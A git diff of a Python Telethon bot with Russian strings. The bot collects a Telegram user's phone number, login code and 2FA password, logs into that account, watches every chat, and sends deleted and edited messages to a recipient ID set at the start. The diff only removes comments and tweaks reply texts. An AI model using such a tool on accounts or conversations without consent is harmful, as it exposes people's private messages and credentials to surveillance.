@@ -21,12 +21,12 @@ bot = TelegramClient('bot_session', API_ID, API_HASH)
 user_client = None
 
 # ========== СОСТОЯНИЯ ==========
-waiting_for_target = False          # ожидание ввода ID
-target_id = None                     # кому отправлять уведомления
+waiting_for_target = False
+target_id = None
 waiting_for_phone = False
 waiting_for_code = None
-waiting_for_password = False         # ожидание 2FA пароля
-temp_password_phone = None           # телефон для 2FA
+waiting_for_password = False
+temp_password_phone = None
 message_cache = {}
 
 # ========== ОБРАБОТЧИКИ ==========
@@ -42,26 +42,25 @@ async def handler(event):
     # === 1. ЕСЛИ ЖДЁМ ID ПОЛУЧАТЕЛЯ ===
     if waiting_for_target:
         try:
-            # Пробуем получить entity по введённому тексту
             target = await bot.get_entity(text.strip())
             target_id = target.id
             waiting_for_target = False
             
-            # Сохраняем инфо о получателе
             target_name = getattr(target, 'first_name', 'пользователь')
             if hasattr(target, 'username') and target.username:
                 target_name += f" (@{target.username})"
             
+            # Отправляем сообщение с кнопкой контакта (правильный синтаксис)
             await event.reply(
                 f"✅ **ID получателя сохранён!**\n\n"
                 f"📬 Все уведомления будут отправляться:\n"
                 f"👤 {target_name} (ID: {target_id})\n\n"
                 f"📞 **Теперь нужно войти в твой аккаунт.**\n"
                 f"Нажми кнопку ниже, чтобы отправить номер телефона.",
-                buttons=[[Button.request_contact("📞 Поделиться контактом")]]
+                buttons=[Button.request_contact("📞 Поделиться контактом")]
             )
         except Exception as e:
-            await event.reply(f"❌ Не удалось найти пользователя: {e}\nПопробуй ещё раз (ID или @username):")
+            await event.reply(f"❌ Ошибка: {e}\nПопробуй ещё раз (ID или @username):")
         return
 
     # === 2. ЕСЛИ ЖДЁМ 2FA ПАРОЛЬ ===
@@ -77,8 +76,7 @@ async def handler(event):
                 f"✅ **Успешный вход с 2FA!**\n\n"
                 f"👤 Аккаунт: @{me.username}\n"
                 f"📱 Номер: {phone}\n\n"
-                f"🔍 Теперь бот будет отслеживать все чаты.\n"
-                f"Уведомления будут приходить получателю."
+                f"🔍 Теперь бот будет отслеживать все чаты."
             )
             
             waiting_for_password = False
@@ -101,14 +99,12 @@ async def handler(event):
             if not await user_client.is_user_authorized():
                 await user_client.sign_in(phone, code)
             
-            # Если всё хорошо — вошли
             me = await user_client.get_me()
             await event.reply(
                 f"✅ **Успешный вход!**\n\n"
                 f"👤 Аккаунт: @{me.username}\n"
                 f"📱 Номер: {phone}\n\n"
-                f"🔍 Теперь бот будет отслеживать все чаты.\n"
-                f"Уведомления будут приходить получателю."
+                f"🔍 Теперь бот будет отслеживать все чаты."
             )
             
             waiting_for_code = None
@@ -116,7 +112,6 @@ async def handler(event):
             asyncio.create_task(monitor_user_chats())
             
         except SessionPasswordNeededError:
-            # Запрашиваем 2FA пароль
             waiting_for_password = True
             temp_password_phone = phone
             waiting_for_code = None
@@ -147,12 +142,10 @@ async def handler(event):
         await event.reply(
             f"📊 **Статистика**\n\n"
             f"📦 Кэш сообщений: {len(message_cache)}\n"
-            f"📬 Получатель: {target_info}\n"
-            f"🔐 2FA: {'ожидание' if waiting_for_password else 'не требуется'}"
+            f"📬 Получатель: {target_info}"
         )
     
     elif text == "/reset":
-        # Сброс настроек
         waiting_for_target = True
         target_id = None
         waiting_for_phone = False
@@ -180,7 +173,6 @@ async def contact_handler(event):
 # ========== МОНИТОРИНГ ЧАТОВ ==========
 
 async def monitor_user_chats():
-    """Мониторит все чаты от имени пользователя"""
     global user_client
     
     if not user_client or not target_id:
@@ -191,7 +183,6 @@ async def monitor_user_chats():
     
     @user_client.on(events.NewMessage)
     async def user_message_handler(event):
-        """Кэшируем сообщения"""
         cache_key = f"{event.chat_id}_{event.message.id}"
         message_cache[cache_key] = {
             'text': event.message.text or "[медиа]",
@@ -207,7 +198,6 @@ async def monitor_user_chats():
 
     @user_client.on(events.MessageDeleted)
     async def user_delete_handler(event):
-        """Удалённые сообщения"""
         for msg_id in event.deleted_ids:
             cache_key = f"{event.chat_id}_{msg_id}"
             if cache_key in message_cache:
@@ -221,13 +211,12 @@ async def monitor_user_chats():
                 await bot.send_message(
                     target_id,
                     f"🗑 **УДАЛЕНО** в чате {chat_name}\n\n"
-                    f"👤 Отправитель: {msg['sender_id']}\n"
+                    f"👤 От: {msg['sender_id']}\n"
                     f"💬 {msg['text'][:300]}"
                 )
 
     @user_client.on(events.MessageEdited)
     async def user_edit_handler(event):
-        """Изменённые сообщения"""
         cache_key = f"{event.chat_id}_{event.message.id}"
         if cache_key in message_cache:
             old = message_cache[cache_key]['text']
